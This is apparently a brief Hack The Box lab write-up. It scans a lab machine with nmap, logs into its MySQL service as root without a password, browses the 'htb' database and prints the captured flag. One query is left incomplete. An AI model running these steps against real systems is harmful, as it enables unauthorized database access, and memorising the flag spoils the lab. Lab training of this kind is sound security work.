Given IP: 10.129.23.22

1) Connected via OpenVPN and started the VM instance. Noted the target machine IP address.
2) Let's start with a nmap scan to enumerate any open ports:
      nmap -sS -sV -p- -T4 -A 10.129.23.22 -vv
   3306/tcp was discovered
3) Attempting to connect unauthenticated:
      mysql -h 10.129.23.22 -u root
   Works.
4) Now for exploration:
      SHOW databses;
   htb looks promising
      USE htb;
      SHOW tables;
      SELECT * FROM 
   The flag is in one of the tables.

Flag: HTB{7b4bec00d1a39e3dd4e021ec3d915da8}
